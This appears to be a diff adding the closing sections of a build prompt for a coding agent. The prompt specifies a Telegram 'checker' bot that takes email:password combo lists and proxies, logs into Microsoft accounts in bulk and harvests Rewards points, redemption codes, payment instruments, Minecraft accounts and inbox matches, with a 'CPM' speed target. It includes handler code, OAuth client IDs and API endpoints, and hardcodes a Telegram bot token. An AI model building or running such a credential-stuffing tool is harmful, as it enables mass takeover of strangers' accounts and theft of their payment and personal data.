+2. Use logging instead of print for debug info.
+
+3. Database file path: use environment variable or
+   default to '/tmp/checker.db' for Railway ephemeral
+   storage. Actually use:
+   DB = os.environ.get('DB_PATH', 'checker.db')
+
+4. Bot token from environment variable with fallback:
+   BOT_TOKEN = os.environ.get('BOT_TOKEN',
+       '8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak')
+   ADMIN_ID = int(os.environ.get('ADMIN_ID', '5944410248'))
+
+5. Procfile already exists in repo:
+   worker: python bot.py
+   Do not change it.
+
+6. requirements.txt must include:
+   python-telegram-bot>=20.0
+   requests
+   beautifulsoup4
+   urllib3
+
+7. No file handles left open. Always close/remove
+   temp files after sending. Use try/finally.
+
+8. On startup, run db.init_db() to create tables.
+   Log: logger.info("AKAZA Bot starting...")
+
+================================================================
+SECTION 11 — bot_main_exec() AND __main__
+================================================================
+
+def bot_main_exec():
+    akaza_db.init_db()
+    logger.info("Database initialized")
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("threads", set_threads))
+    app.add_handler(CommandHandler("keywords", set_keywords))
+    app.add_handler(CommandHandler("addkw", add_keyword))
+    app.add_handler(CommandHandler("clearkw", clear_keywords))
+    app.add_handler(CommandHandler("check", single_check))
+    app.add_handler(CommandHandler("fastmode", toggle_fastmode))
+    app.add_handler(CallbackQueryHandler(cb_handler))
+    # Admin commands (!! prefix)
+    app.add_handler(MessageHandler(
+        filters.TEXT & filters.Regex(r'^!!'),
+        admin_cmd_handler))
+    # Proxy file upload (caption contains "prox")
+    app.add_handler(MessageHandler(
+        filters.Document.FileExtension("txt") &
+        filters.CaptionRegex(re.compile(r'prox', re.I)),
+        handle_proxies))
+    # Combo file upload
+    app.add_handler(MessageHandler(
+        filters.Document.FileExtension("txt"),
+        handle_combo))
+    # Inline combo text (contains :)
+    app.add_handler(MessageHandler(
+        filters.TEXT & filters.Regex(r'[^!].+:.+'),
+        handle_combo))
+    logger.info("Bot started polling")
+    app.run_polling(drop_pending_updates=True)
+
+if __name__ == '__main__':
+    bot_main_exec()
+
+================================================================
+SECTION 12 — WHAT NOT TO INCLUDE
+================================================================
+
+Do NOT include from flux.py:
+  - RewardsApp class, CLI menus, tkinter file dialogs,
+    rich console prints, show_main_menu, Settings class
+    saving to JSON, run() method, main()
+
+Do NOT include from hit.py:
+  - LiveStats, EnhancedResultManager, print_banner,
+    print_menu_header, if __name__ == "__main__" CLI
+
+Do NOT include from p7.py:
+  - check_bulk, print_banner, check_single CLI logic,
+    stats dict, update_progress, if __name__ CLI
+
+Do NOT include:
+  - Multiple main() or if __name__ blocks
+  - Any input() calls
+  - console.print() or rich imports
+  - tkinter imports
+  - os.system('cls') or os.system('clear')
+
+================================================================
+SECTION 13 — COMPLETE API REFERENCE
+================================================================
+
+All URLs used in this bot (DO NOT CHANGE ANY OF THESE):
+
+LOGIN (flux.py flow):
+  https://login.live.com/oauth20_authorize.srf
+    ?client_id=00000000402B5328
+    &redirect_uri=https://login.live.com/oauth20_desktop.srf
+    &scope=service::user.auth.xboxlive.com::MBI_SSL
+    &display=touch&response_type=token&locale=en
+
+REWARDS POINTS:
+  https://rewards.bing.com/api/getuserinfo
+  https://www.bing.com/rewardsapp/flyoutHub?format=json
+  https://rewards.bing.com
+
+REDEMPTION CODES:
+  https://rewards.bing.com/redeem/orderhistory
+  https://rewards.bing.com/redeem/getorderdetails (POST)
+
+PROFILE:
+  https://substrate.office.com/profileb2/v2.0/me/V1Profile
+
+INBOX SEARCH:
+  https://outlook.live.com/search/api/v2/query
+
+MICROSOFT SUBSCRIPTIONS (hit.py):
+  Silent token:
+    https://login.live.com/oauth20_authorize.srf
+      ?client_id=000000000004773A
+      &response_type=token
+      &scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete
+      &redirect_uri=https://account.microsoft.com/auth/
+               complete-silent-delegate-auth
+      &prompt=none
+  Payment instruments:
+    https://paymentinstruments.mp.microsoft.com/v6.0/
+        users/me/paymentInstrumentsEx
+        ?status=active,removed&language=en-US
+  Transactions:
+    https://paymentinstruments.mp.microsoft.com/v6.0/
+        users/me/paymentTransactions
+
+MINECRAFT (Xbox chain):
+  https://user.auth.xboxlive.com/user/authenticate
+  https://xsts.auth.xboxlive.com/xsts/authorize
+  https://api.minecraftservices.com/authentication/login_with_xbox
+  https://api.minecraftservices.com/minecraft/profile
+
+================================================================
+SECTION 14 — QUICK SUMMARY FOR JULES
+================================================================
+
+1. Login: Use flux.py SFTAG_URL + get_urlPost_sFTTag +
+   get_xbox_rps exactly. This gives best CPM.
+
+2. Token: The token from flux.py login is Xbox MBI_SSL
+   scope. It works with:
+   - rewards.bing.com (session cookie auth)
+   - Xbox chain for Minecraft
+   - substrate.office.com profile (use as Bearer)
+   - outlook.live.com search (use as Bearer after
+     also including X-AnchorMailbox: CID:xxx)
+   - login.live.com silent auth for payment token
+
+3. Capture order: points -> codes -> subs ->
+   profile -> minecraft -> inbox scan (all in parallel
+   ideally using asyncio.gather on executor futures)
+
+4. Inbox scan: batch OR queries for speed. Cover all
+   100+ services from inbooxer_hotmail.py SERVICE list.
+
+5. Admin: all !!commands, broadcast, timed access,
+   mod system, owner-only mod/unmod.
+
+6. Railway: env vars for token/admin_id, no GUI,
+   logging not print, cleanup temp files.
+
+7. CPM target: 200+ with proxies. The flux.py login
+   is fast because it's a single POST with redirect,
+   not a multi-step OAuth code exchange.
+
+================================================================
+END OF PROMPT
+================================================================
